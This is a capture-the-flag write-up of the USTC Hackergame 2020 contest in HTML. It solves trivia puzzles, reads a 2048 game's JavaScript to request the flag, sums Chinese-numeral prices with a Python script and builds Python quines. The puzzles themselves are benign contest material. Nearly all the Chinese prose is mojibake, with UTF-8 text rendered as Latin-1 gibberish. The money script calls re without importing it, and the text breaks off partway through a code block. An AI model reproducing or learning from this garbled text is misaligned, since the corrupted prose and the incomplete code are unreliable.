æ˜¯å¤šå°‘æ¯«å…‹ï¼Ÿ<br>æç¤ºï¼šå’•å’•å’•ï¼Œå’•å’•å’•ã€‚</p><p>è¿™ä¸ªé¢˜çœŸçš„æœ‰æ„æ€ã€‚æœ€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯å¾ˆå¸¸è§çš„ 1500 bytesï¼Œæˆ–è€… PPPOE çš„1492bytesï¼Œä½†éƒ½ä¸å¯¹ã€‚</p><p>äºæ˜¯çœŸå°±å»æ‰¾äº†ï¼Œæ²¡æƒ³åˆ°çœŸæœ‰ç¦½ç±»ä½œä¸ºæ ‡å‡†è¿™ä¸€è¯´ã€‚</p><p><a href="https://baike.baidu.com/item/%E4%BF%A1%E9%B8%BDIP%E9%80%9A%E8%AE%AF/7013924?fr=aladdin">ç™¾åº¦ç™¾ç§‘ï¼šä¿¡é¸½IPé€šè®¯</a></p><p><strong>â€œç¦½ç±»ä½œä¸ºè½½ä½“ä¼ è¾“IPæ•°æ®åŒ…æ ‡å‡†â€</strong></p><p>è¯¦è§ <a href="http://www.faqs.org/rfcs/rfc1149.html">RFC 1149 - Standard for the transmission of IP datagrams on avia</a>ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023000333.png" alt="MTU"></p><p>å¾—åˆ°å…¶ MTU ä¸º 256 æ¯«å…‹ã€‚ç»äº†ï¼</p><blockquote><p>BTW, é¡ºä¾¿æŸ¥åˆ°äº† å¸¸è§çš„ MTU æ ‡å‡†ã€‚</p><p>è¯¦è§ <a href="https://tools.ietf.org/html/rfc1191">RFC 1191: Path MTU Discovery</a>ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023622367.png" alt="Common MTUs in the Internet"></p></blockquote></li><li><p>USTC Linux ç”¨æˆ·åä¼šåœ¨ 2019 å¹´ 9 æœˆ 21 æ—¥è‡ªç”±è½¯ä»¶æ—¥æ´»åŠ¨ä¸­ä»‹ç»çš„å¼€æºæ¸¸æˆçš„åç§°å…±æœ‰å‡ ä¸ªå­—æ¯ï¼Ÿ<br>æç¤ºï¼šæ´»åŠ¨è®°å½•ä¼šåœ¨å“ªé‡Œï¼Ÿ</p><p><a href="https://lug.ustc.edu.cn/wiki/lug/events/">https://lug.ustc.edu.cn/wiki/lug/events/</a></p><p><a href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/slides/%E9%97%AA%E7%94%B5%E6%BC%94%E8%AE%B2/Teeworlds/teeworlds.pdf">https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/slides/%E9%97%AA%E7%94%B5%E6%BC%94%E8%AE%B2/Teeworlds/teeworlds.pdf</a></p><p>TEEWORLDS</p><p>9</p></li><li><p>ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿æ ¡åŒºå›¾ä¹¦é¦†æ­£å‰æ–¹ï¼ˆè¥¿å—æ–¹å‘ï¼‰ 50 ç±³ L å‹çŒæœ¨å¤„å…±æœ‰å‡ ä¸ªè¿é€šçš„åˆ’çº¿åœè½¦ä½ï¼Ÿ<br>æç¤ºï¼šå»ºè®®èº«ä¸´å…¶å¢ƒã€‚</p><p><a href="https://map.baidu.com/poi/%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%A4%A7%E5%AD%A6(%E8%A5%BF%E6%A0%A1%E5%8C%BA)/@13053819.58,3720218.68,21z,87t,-84.8h?uid=f55a47578c94cfb15cd4fef9&amp;ugc_type=3&amp;ugc_ver=1&amp;device_ratio=2&amp;compat=1&amp;querytype=detailConInfo&amp;da_src=shareurl#panoid=09010500121705221534309496D&amp;panotype=street&amp;heading=336.61&amp;pitch=-19.46&amp;l=21&amp;tn=B_NORMAL_MAP&amp;sc=0&amp;newmap=1&amp;shareurl=1&amp;pid=09010500121705221534309496D">ç™¾åº¦å®æ™¯åœ°å›¾</a> å¥½å•Šï¼</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101020104659.png" alt="baidu map"></p><p>9</p></li><li><p>ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬å…­å±Šä¿¡æ¯å®‰å…¨å¤§èµ›æ‰€æœ‰äººåˆè®¡æäº¤äº†å¤šå°‘æ¬¡ flagï¼Ÿ<br>æç¤ºï¼šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚</p><p>å‚è€ƒ <a href="https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/">https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/</a></p><blockquote><p>ç»ç»Ÿè®¡ï¼Œåœ¨æœ¬æ¬¡æ¯”èµ›ä¸­ï¼Œæ€»å…±æœ‰ 2682 äººæ³¨å†Œï¼Œ1904 äººè‡³å°‘å®Œæˆäº†ä¸€é¢˜ã€‚æ¯”èµ›æœŸé—´æ‰€æœ‰äººåˆè®¡æäº¤äº† 17098 æ¬¡ flagï¼Œå…¶ä¸­çº¦ 57.44% ä¸ºæ­£ç¡®çš„æäº¤ã€‚</p></blockquote><p>17098 </p></li></ol><p>æŠ“äº†ä¸ªåŒ…æ‹¿å» Burp Suite æš´åŠ›è§£ç¬¬ä¸€é¢˜ç­”æ¡ˆ<em>ï¼ˆå¤§é›¾</em></p><p>æœ€åå¾—åˆ° flagã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023338503.png" alt="flag"></p><hr><h2 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h2><p>å¥½ä¸€ä¸ªç¿»ç‰ˆçš„2048ï¼Œç„¶è€ŒçœŸæ­£è¦åˆ° 2^14 æ‰è¡Œï¼ˆ</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161235179.png"></p><p>ç©äº†å‡ å±€å‘ç°ç©ä¸ä¸‹å»äº†ï¼Œç›´æ¥çœ‹æºç å¥½äº†å§ã€‚</p><p>å…³é”®çš„æºç åœ¨ <code>html_actuator.js</code> æœ€åè¿™ä¸€æ®µã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">HTMLActuator</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">message</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">won</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> type    <span class="token operator">=</span> won <span class="token operator">?</span> <span class="token string">"game-won"</span> <span class="token operator">:</span> <span class="token string">"game-over"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> message <span class="token operator">=</span> won <span class="token operator">?</span> <span class="token string">"FLXG å¤§æˆåŠŸï¼"</span> <span class="token operator">:</span> <span class="token string">"FLXG æ°¸ä¸æ”¾å¼ƒï¼"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> url<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>won<span class="token punctuation">)</span> <span class="token punctuation">{</span>        url <span class="token operator">=</span> <span class="token string">"/getflxg?my_favorite_fruit="</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">+</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        url <span class="token operator">=</span> <span class="token string">"/getflxg?my_favorite_fruit="</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'text'</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"game-message-extra"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> request<span class="token punctuation">.</span>response<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>å…¶ä¸­</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161459047.png" alt="banana"></p><p><code>NaN</code> æ‹¼æ¥å¯è¿˜è¡Œï¼ŒJS çœŸå¥‡å¦™ã€‚</p><p>äºæ˜¯æ„é€ è¯·æ±‚ </p><p><a href="http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana">http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana</a></p><p>å³å¯æ‹¿åˆ° flag äº†ï¼</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161551356.png" alt="flag"></p><hr><h2 id="ä¸€é—ªè€Œè¿‡çš„-Flag"><a href="#ä¸€é—ªè€Œè¿‡çš„-Flag" class="headerlink" title="ä¸€é—ªè€Œè¿‡çš„ Flag"></a>ä¸€é—ªè€Œè¿‡çš„ Flag</h2><p>åœ¨å‘½ä»¤è¡Œé‡Œæ‰“å¼€å°±å®Œäº‹äº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161713760.png" alt="flag"></p><hr><h2 id="ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº"><a href="#ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº" class="headerlink" title="ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº"></a>ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº</h2><blockquote><p>å¦‚åŒå¾€å¸¸ä¸€æ ·ï¼Œä½ çš„ npy çªç„¶ä¸¢ç»™ä½ ä¸€ä¸ªè´­ç‰©è´¦å•ï¼šâ€œæˆ‘ä»Šå¤©ä¹°äº†å‡ ä¸ªå°ç©æ„ï¼Œä½ èƒ½å¸®æˆ‘ç®—ä¸€ä¸‹ä¸€å…±èŠ±äº†å¤šå°‘é’±å—ï¼Ÿâ€</p><p>ä½ å¿ƒæƒ³ï¼š<del>åˆåŒå’å•è¦å¼€å§‹åƒåœŸäº†</del> è¿™ä¸æ˜¯å¾ˆç®€å•å—ï¼Ÿç”µå­è¡¨æ ¼é‡Œé¢ä¸€æ‹–åŠ¨å°±ç®—å‡ºæ¥äº†</p><p>åªä¸è¿‡æ‹¿åˆ°è´¦å•ä¹‹åä½ æ‰æ³¨æ„åˆ°ï¼Œä¼¼ä¹æ˜¯ä¸ºäº†å‰æ‰‹æ—¶æ›´åŠ çš„å®‰å¿ƒï¼Œè¿™æ¬¡çš„è´¦å•ä¸Šé¢çš„é‡‘é¢å…¨ä½¿ç”¨äº†ä¸­æ–‡å¤§å†™æ•°å­—</p><p><strong>æ³¨æ„ï¼šè¯·å°†è´¦å•æ€»é‡‘é¢ä¿ç•™å°æ•°ç‚¹åä¸¤ä½ï¼Œæ”¾åœ¨ <code>flag{}</code> ä¸­æäº¤ï¼Œä¾‹å¦‚æ€»é‡‘é¢ä¸º 123.45 å…ƒæ—¶ï¼Œä½ éœ€è¦æäº¤ <code>flag{123.45}</code></strong></p></blockquote><p>å‘ç°æ˜¯ä¸ª excelã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161905992.png" alt="excel"></p><p>æ€»å…±æœ‰1000è¡Œæ•°æ®ï¼Œæœ¬æ¥æƒ³åœ¨é‡Œé¢ç›´æ¥è½¬æ¢çš„ï¼Œä½†è¯•äº†ä¸€ä¸‹å‘ç°æ²¡æ‰¾åˆ°è‡ªå¸¦çš„å·¥å…·ï¼Œäºæ˜¯ç”¨ Python å†™ä¸ªè„šæœ¬ç®—ç®—å¥½äº†ã€‚</p><p>é¦–å…ˆç”¨æ­£åˆ™åŒ¹é…å…ˆæŠŠå…ƒã€è§’ã€åˆ†ç»™æå–å‡ºæ¥ï¼Œç„¶åå†™ä¸ªå­—å…¸è½¬æ¢å°±å¥½äº†ã€‚</p><p>è¿™é‡Œçš„è½¬æ¢å‚è€ƒäº† <a href="https://www.cnblogs.com/tanrong/p/10434172.html">Python ä¸­æ–‡(å¤§å†™)æ•°å­—è½¬é˜¿æ‹‰ä¼¯æ•°å­—</a>ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šç»“åˆè¿™é¢˜æ”¹äº†æ”¹ä»£ç ã€‚</p><p>å¦å¤–è€ƒè™‘åˆ°æµ®ç‚¹è¿ç®—å¯èƒ½å¸¦æ¥çš„ç²¾åº¦é—®é¢˜ï¼Œå…ƒã€è§’ã€åˆ†å•ç‹¬ç»Ÿè®¡ï¼Œæœ€åè¿›è¡Œåˆå¹¶ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""Hackergame 2020ä»é›¶å¼€å§‹çš„è®°è´¦å·¥å…·äºº@Author: MiaoTony@Time: 20201031"""</span><span class="token comment"># constants for chinese_to_arabic</span>CN_NUM <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'ã€‡'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'ä¸€'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'äºŒ'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'ä¸‰'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'å››'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'äº”'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'å…­'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'ä¸ƒ'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'å…«'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'ä¹'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'é›¶'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">'å£¹'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'è´°'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'å'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'è‚†'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'ä¼'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'é™†'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'æŸ’'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'æŒ'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'ç–'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'è²®'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'ä¸¤'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">}</span>CN_UNIT <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'å'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>    <span class="token string">'æ‹¾'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>    <span class="token string">'ç™¾'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>    <span class="token string">'ä½°'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>    <span class="token string">'åƒ'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>    <span class="token string">'ä»Ÿ'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>    <span class="token string">'ä¸‡'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>    <span class="token string">'è¬'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>    <span class="token string">'äº¿'</span><span class="token punctuation">:</span> <span class="token number">100000000</span><span class="token punctuation">,</span>    <span class="token string">'å„„'</span><span class="token punctuation">:</span> <span class="token number">100000000</span><span class="token punctuation">,</span>    <span class="token string">'å…†'</span><span class="token punctuation">:</span> <span class="token number">1000000000000</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">chinese_to_arabic</span><span class="token punctuation">(</span>cn<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>    unit <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># current</span>    ldig <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># digest</span>    <span class="token keyword">for</span> cndig <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>cn<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> cndig <span class="token keyword">in</span> CN_UNIT<span class="token punctuation">:</span>            unit <span class="token operator">=</span> CN_UNIT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cndig<span class="token punctuation">)</span>            <span class="token keyword">if</span> unit <span class="token operator">==</span> <span class="token number">10000</span> <span class="token keyword">or</span> unit <span class="token operator">==</span> <span class="token number">100000000</span><span class="token punctuation">:</span>                ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span>unit<span class="token punctuation">)</span>                unit <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            dig <span class="token operator">=</span> CN_NUM<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cndig<span class="token punctuation">)</span>            <span class="token keyword">if</span> unit<span class="token punctuation">:</span>                dig <span class="token operator">*=</span> unit                unit <span class="token operator">=</span> <span class="token number">0</span>            ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dig<span class="token punctuation">)</span>    <span class="token keyword">if</span> unit <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    val<span class="token punctuation">,</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>ldig<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10000</span> <span class="token keyword">or</span> x <span class="token operator">==</span> <span class="token number">100000000</span><span class="token punctuation">:</span>            val <span class="token operator">+=</span> tmp <span class="token operator">*</span> x            tmp <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp <span class="token operator">+=</span> x    val <span class="token operator">+=</span> tmp    <span class="token keyword">return</span> val<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""è´°æ‹¾å…ƒé™†è§’ä¼åˆ†1    å£¹å…ƒå£¹è§’è´°åˆ†4    æ‹¾æŒå…ƒä¼è§’å£¹åˆ†1    ...    """</span>    l <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token comment"># print(len(l))</span>    re_split <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(.*å…ƒ)?(.*è§’)?(.*åˆ†)?'</span><span class="token punctuation">)</span>    total_yuan <span class="token operator">=</span> <span class="token number">0</span>    total_jiao <span class="token operator">=</span> <span class="token number">0</span>    total_fen <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> l<span class="token punctuation">:</span>        yuan_int <span class="token operator">=</span> <span class="token number">0</span>        jiao_int <span class="token operator">=</span> <span class="token number">0</span>        fen_int <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>        money <span class="token operator">=</span> row<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        count <span class="token operator">=</span> row<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        count_int <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span>        money_group <span class="token operator">=</span> re_split<span class="token punctuation">.</span>search<span class="token punctuation">(</span>money<span class="token punctuation">)</span>        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yuan <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            yuan_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>yuan<span class="token punctuation">)</span>        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            jiao <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            jiao_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>jiao<span class="token punctuation">)</span>        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            fen <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            fen_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>fen<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>yuan_int<span class="token punctuation">,</span> jiao_int<span class="token punctuation">,</span> fen_int<span class="token punctuation">)</span>        total_yuan <span class="token operator">+=</span> yuan_int <span class="token operator">*</span> count_int        total_jiao <span class="token operator">+=</span> jiao_int <span class="token operator">*</span> count_int        total_fen <span class="token operator">+=</span> fen_int <span class="token operator">*</span> count_int    total <span class="token operator">=</span> total_yuan <span class="token operator">+</span> total_jiao <span class="token operator">*</span> <span class="token number">0.1</span> <span class="token operator">+</span> total_fen <span class="token operator">*</span> <span class="token number">0.01</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"total:"</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031162456877.png" alt="results"></p><p>æ‰€ä»¥å°±æ˜¯ </p><p><code>flag{20132.81}</code></p><blockquote><p>åé¢æ‰çŸ¥é“ï¼Œè¿™é¢˜å±…ç„¶æ˜¯åŠ¨æ€ flagï¼Œä¹Ÿå°±æ˜¯è¯´åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶ã€‚å‡ºé¢˜å¸ˆå‚…ä»¬å¤ªå¼ºäº†ï¼</p><p>BTWï¼Œè¿˜å‘ç°äº†ä¸€ä¸ªå¥½ç”¨çš„åº“ **<a href="https://github.com/Ailln/cn2an">cn2an</a>**ã€‚</p><blockquote><p>ğŸ“¦ å¿«é€Ÿè½¬åŒ–ã€Œä¸­æ–‡æ•°å­—ã€å’Œã€Œé˜¿æ‹‰ä¼¯æ•°å­—ã€ï½ (æœ€æ–°ç‰¹æ€§ï¼šåˆ†æ•°ï¼Œæ—¥æœŸã€æ¸©åº¦ç­‰è½¬åŒ–ï¼‰    </p></blockquote></blockquote><hr><h2 id="è‡ªå¤è¯»çš„å¤è¯»æœº"><a href="#è‡ªå¤è¯»çš„å¤è¯»æœº" class="headerlink" title="è‡ªå¤è¯»çš„å¤è¯»æœº"></a>è‡ªå¤è¯»çš„å¤è¯»æœº</h2><blockquote><p>ä½ ç°åœ¨éœ€è¦ç¼–å†™ä¸¤ä¸ªåªæœ‰ä¸€è¡Œ Python ä»£ç çš„é¡¶å°–å¤è¯»æœºï¼š</p><ul><li>å…¶ä¸­ä¸€ä¸ªè¦è¾“å‡ºä»£ç æœ¬èº«çš„é€†åºï¼ˆå³æ‰€æœ‰å­—ç¬¦ä»åå‘å‰ä¾æ¬¡è¾“å‡ºï¼‰</li><li>å¦ä¸€ä¸ªæ˜¯è¾“å‡ºä»£ç æœ¬èº«çš„ sha256 å“ˆå¸Œå€¼ï¼Œåå…­è¿›åˆ¶å°å†™</li></ul><p>æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶åˆ†åˆ«å¯¹åº”äº†ä¸¤ä¸ª flagã€‚</p></blockquote><p>å‚è€ƒï¼š</p><p><a href="https://en.wikipedia.org/wiki/Quine_(computing)">Wikipedia: Quine (computing)</a></p><p><a href="https://zhuanlan.zhihu.com/p/125114823">Bä¹ï¼šå¦‚ä½•ç¼–å†™ä¸€ä¸ªæ‰“å°è‡ªèº«æºä»£ç çš„ç¨‹åº</a></p><blockquote><p>åœ¨Pythonä¸­æœ‰ä¸€ä¸ª <code>%r</code>ï¼Œå®ƒçš„æ„æ€å°±æ˜¯è°ƒç”¨å¯¹è±¡çš„ <code>repr()</code> æ–¹æ³•åæ›¿æ¢æœ¬èº«åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼Œå¯¹äºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œä¼šä¿ç•™å…¶æœ¬èº«çš„å¼•å·ï¼ˆè¿™ç‚¹åœ¨æˆ‘ä»¬å®ç° Quine çš„æ—¶å€™ä¼šå‡å°‘å¾ˆå¤šéº»çƒ¦ï¼‰ã€‚</p></blockquote><h3 id="è¾“å‡ºä»£ç æœ¬èº«çš„é€†åº"><a href="#è¾“å‡ºä»£ç æœ¬èº«çš„é€†åº" class="headerlink" title="è¾“å‡ºä»£ç æœ¬èº«çš„é€†åº"></a>è¾“å‡ºä»£ç æœ¬èº«çš„é€†åº</h3><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"s = %r;print(''.join(reversed(s %% s)),end='')"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">reversed</span><span class="token punctuation">(</span>s <span class="token operator">%</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102182322408.png" alt="flag"></p><p>BTWï¼Œè¿™ä¸ªé¢˜æœ¬æ¥æƒ³åœ¨ VPS ä¸Šæ­ä¸ªæ¥å£ç›´æ¥è¿”å›çš„é€†å‘çš„å­—ç¬¦ä¸²ï¼Œä¸è¿‡å‘ç°è¿™ä¸ªæœºå™¨å¥½åƒä¸é€šå¤–ç½‘äºæ˜¯ä¸è¡Œï¼Ÿ</p><p>BTWï¼Œè¿™ä¸ª<code>exec()</code>å¯ä»¥ç›´æ¥è¯»æºç ä½†ä¸èƒ½è¯» flagï¼Œ2333. åŸå› æ˜¯ç”¨äº† subprocess ä»¥ nobody ç”¨æˆ·å»æ‰§è¡Œè„šæœ¬ï¼Œè€Œ flag æ”¾åœ¨äº† /root ç›®å½•ä¸‹ã€‚</p><h3 id="è¾“å‡ºä»£ç æœ¬èº«çš„-sha256-å“ˆå¸Œå€¼"><a href="#è¾“å‡ºä»£ç æœ¬èº«çš„-sha256-å“ˆå¸Œå€¼" class="headerlink" title="è¾“å‡ºä»£ç æœ¬èº«çš„ sha256 å“ˆå¸Œå€¼"></a>è¾“å‡ºä»£ç æœ¬èº«çš„ sha256 å“ˆå¸Œå€¼</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token punctuation">;</span>m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token string">"import hashlib;m=hashlib.sha256();s=%r;m.update((s %% s).encode());print(m.hexdigest(),end='')"</span><span class="token 